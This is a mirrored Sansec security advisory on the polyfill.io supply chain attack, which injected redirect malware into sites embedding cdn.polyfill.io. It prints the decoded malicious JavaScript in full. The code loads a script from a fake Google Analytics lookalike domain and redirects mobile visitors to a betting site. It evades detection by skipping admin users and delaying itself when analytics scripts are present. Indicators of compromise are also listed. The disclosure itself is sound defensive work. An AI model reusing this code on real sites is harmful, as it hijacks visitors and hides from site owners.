<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://sansec.io/research/polyfill-supply-chain-attack">Original</a>
    <h1>Polyfill supply chain attack hits 100K&#43; sites</h1>
    
    <div id="readability-page-1" class="page"><div><p><strong>Update June 25th</strong>: Google has already started blocking Google Ads for eCommerce sites that use polyfill.io.</p><p>The <code>polyfill.js</code> is a popular open source library to support older browsers. <a href="https://publicwww.com/websites/%22cdn.polyfill.io%22/">100K+ sites</a> embed it using the <code>cdn.polyfill.io</code> domain. Notable users are JSTOR, Intuit and World Economic Forum. However, in February this year, a Chinese company bought the domain and the Github account. Since then, this domain was caught injecting <a href="https://web.archive.org/web/20240624110153/https://github.com/polyfillpolyfill/polyfill-service/issues/2873">malware</a> on mobile devices via any site that embeds <code>cdn.polyfill.io</code>. Any complaints were quickly removed (<a href="https://web.archive.org/web/20240229113710/https://github.com/polyfillpolyfill/polyfill-service/issues/2834">archive here</a>) from the Github repository.</p><p>The polyfill code is dynamically generated based on the HTTP headers, so multiple attack vectors are likely. Sansec decoded one particular malware (see below) which redirects mobile users to a <a href="https://w9.vty70.net/">sports betting site</a> using a fake Google analytics domain (<code>www.googie-anaiytics.com</code>). The code has specific protection against reverse engineering, and only activates on specific mobile devices at specific hours. It also does not activate when it detects an admin user. It also delays execution when a web analytics service is found, presumably to not end up in the stats.</p><p>The original <a href="https://x.com/triblondon/status/1761852117579427975">polyfill author</a> recommends to not use Polyfill at all, as it is no longer needed by modern browsers anyway. Meanwhile, both <a href="https://community.fastly.com/t/new-options-for-polyfill-io-users/2540">Fastly</a> and <a href="https://cdnjs.cloudflare.com/polyfill">Cloudflare</a> have put up trustworthy alternatives, if you still need it.</p><p>This incident is a typical example of a supply chain attack. To get visibility into the code that your users are loading, we recommend our (free) CSP monitoring service <a href="https://sansec.io/watch">Sansec Watch</a>.</p><p>Our <a href="https://sansec.io/#ecomscan">eComscan backend scanner</a> has also been updated with <a href="https://polyfill.io">polyfill.io</a> detection.</p><h2 id="polyfill-malicious-payload-example" tabindex="-1">Polyfill malicious payload example</h2><p>We added some names for readability, however <code>tiaozhuan</code> came from the original malware (which means &#34;jump&#34; in Chinese).</p><pre><code><span>function</span> <span>isPc</span>(<span></span>) {
  <span>try</span> {
    <span>var</span> _isWin =
        navigator.<span>platform</span> == <span>&#34;Win32&#34;</span> || navigator.<span>platform</span> == <span>&#34;Windows&#34;</span>,
      _isMac =
        navigator.<span>platform</span> == <span>&#34;Mac68K&#34;</span> ||
        navigator.<span>platform</span> == <span>&#34;MacPPC&#34;</span> ||
        navigator.<span>platform</span> == <span>&#34;Macintosh&#34;</span> ||
        navigator.<span>platform</span> == <span>&#34;MacIntel&#34;</span>;
    <span>if</span> (_isMac || _isWin) {
      <span>return</span> <span>true</span>;
    } <span>else</span> {
      <span>return</span> <span>false</span>;
    }
  } <span>catch</span> (_0x44e1f6) {
    <span>return</span> <span>false</span>;
  }
}
<span>function</span> <span>vfed_update</span>(<span>_0x5ae1f8</span>) {
  _0x5ae1f8 !== <span>&#34;&#34;</span> &amp;&amp;
    <span>loadJS</span>(
      <span>&#34;https://www.googie-anaiytics.com/html/checkcachehw.js&#34;</span>,
      <span>function</span> (<span></span>) {
        <span>if</span> (usercache == <span>true</span>) {
          <span>window</span>.<span>location</span>.<span>href</span> = _0x5ae1f8;
        }
      }
    );
}
<span>function</span> <span>check_tiaozhuan</span>(<span></span>) {
  <span>var</span> _isMobile = navigator.<span>userAgent</span>.<span>match</span>(
    <span>/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span>
  );
  <span>if</span> (_isMobile) {
    <span>var</span> _curHost = <span>window</span>.<span>location</span>.<span>host</span>,
      _ref = <span>document</span>.<span>referrer</span>,
      _redirectURL = <span>&#34;&#34;</span>,
      _kuurzaBitGet = <span>&#34;https://kuurza.com/redirect?from=bitget&#34;</span>,
      _rnd = <span>Math</span>.<span>floor</span>(<span>Math</span>.<span>random</span>() * <span>100</span> + <span>1</span>),
      _date = <span>new</span> <span>Date</span>(),
      _hours = _date.<span>getHours</span>();
    <span>if</span> (
      _curHost.<span>indexOf</span>(<span>&#34;www.dxtv1.com&#34;</span>) !== -<span>1</span> ||
      _curHost.<span>indexOf</span>(<span>&#34;www.ys752.com&#34;</span>) !== -<span>1</span>
    ) {
      _redirectURL = <span>&#34;https://kuurza.com/redirect?from=bitget&#34;</span>;
    } <span>else</span> {
      <span>if</span> (_curHost.<span>indexOf</span>(<span>&#34;shuanshu.com.com&#34;</span>) !== -<span>1</span>) {
        _redirectURL = <span>&#34;https://kuurza.com/redirect?from=bitget&#34;</span>;
      } <span>else</span> {
        <span>if</span> (_ref.<span>indexOf</span>(<span>&#34;.&#34;</span>) !== -<span>1</span> &amp;&amp; _ref.<span>indexOf</span>(_curHost) == -<span>1</span>) {
          _redirectURL = <span>&#34;https://kuurza.com/redirect?from=bitget&#34;</span>;
        } <span>else</span> {
          <span>if</span> (_hours &gt;= <span>0</span> &amp;&amp; _hours &lt; <span>2</span>) {
            <span>if</span> (_rnd &lt;= <span>10</span>) {
              _redirectURL = _kuurzaBitGet;
            }
          } <span>else</span> {
            <span>if</span> (_hours &gt;= <span>2</span> &amp;&amp; _hours &lt; <span>4</span>) {
              _rnd &lt;= <span>15</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
            } <span>else</span> {
              <span>if</span> (_hours &gt;= <span>4</span> &amp;&amp; _hours &lt; <span>7</span>) {
                _rnd &lt;= <span>20</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
              } <span>else</span> {
                _hours &gt;= <span>7</span> &amp;&amp; _hours &lt; <span>8</span>
                  ? _rnd &lt;= <span>10</span> &amp;&amp; (_redirectURL = _kuurzaBitGet)
                  : _rnd &lt;= <span>10</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
              }
            }
          }
        }
      }
    }
    _redirectURL != <span>&#34;&#34;</span> &amp;&amp;
      !<span>isPc</span>() &amp;&amp;
      <span>document</span>.<span>cookie</span>.<span>indexOf</span>(<span>&#34;admin_id&#34;</span>) == -<span>1</span> &amp;&amp;
      <span>document</span>.<span>cookie</span>.<span>indexOf</span>(<span>&#34;adminlevels&#34;</span>) == -<span>1</span> &amp;&amp;
      <span>vfed_update</span>(_redirectURL);
  }
}
<span>let</span> _outerPage = <span>document</span>.<span>documentElement</span>.<span>outerHTML</span>,
  bdtjfg = _outerPage.<span>indexOf</span>(<span>&#34;hm.baidu.com&#34;</span>) != -<span>1</span>;
<span>let</span> cnzfg = _outerPage.<span>indexOf</span>(<span>&#34;.cnzz.com&#34;</span>) != -<span>1</span>,
  wolafg = _outerPage.<span>indexOf</span>(<span>&#34;.51.la&#34;</span>) != -<span>1</span>;
<span>let</span> mattoo = _outerPage.<span>indexOf</span>(<span>&#34;.matomo.org&#34;</span>) != -<span>1</span>,
  aanaly = _outerPage.<span>indexOf</span>(<span>&#34;.google-analytics.com&#34;</span>) != -<span>1</span>;
<span>let</span> ggmana = _outerPage.<span>indexOf</span>(<span>&#34;.googletagmanager.com&#34;</span>) != -<span>1</span>,
  aplausix = _outerPage.<span>indexOf</span>(<span>&#34;.plausible.io&#34;</span>) != -<span>1</span>,
  statcct = _outerPage.<span>indexOf</span>(<span>&#34;.statcounter.com&#34;</span>) != -<span>1</span>;
bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct
  ? <span>setTimeout</span>(check_tiaozhuan, <span>2000</span>)
  : <span>check_tiaozhuan</span>();
</code></pre><h2 id="indicators-of-compromise" tabindex="-1">Indicators of compromise</h2><pre><code>https://kuurza.com/redirect?from=bitget
https://www.googie-anaiytics.com/html/checkcachehw.js
https://www.googie-anaiytics.com/ga.js
</code></pre><h2>Read more</h2><ul><li><a href="https://sansec.io/research/cosmicsting">CosmicSting attack threatens 75% of Adobe Commerce stores</a></li><li><a href="https://sansec.io/research/magento-xml-backdoor">Persistent Magento backdoor hidden in XML</a></li><li><a href="https://sansec.io/research/virustotal-sansec">Sansec joins forces with Google&#39;s VirusTotal</a></li><li><a href="https://sansec.io/research/europol-sansec-action">Sansec and Europol counter online skimming</a></li><li><a href="https://sansec.io/research/magento-wish-list-exploits">Magento wish list exploit bypasses WAF protection</a></li></ul></div></div>
  </body>
</html>
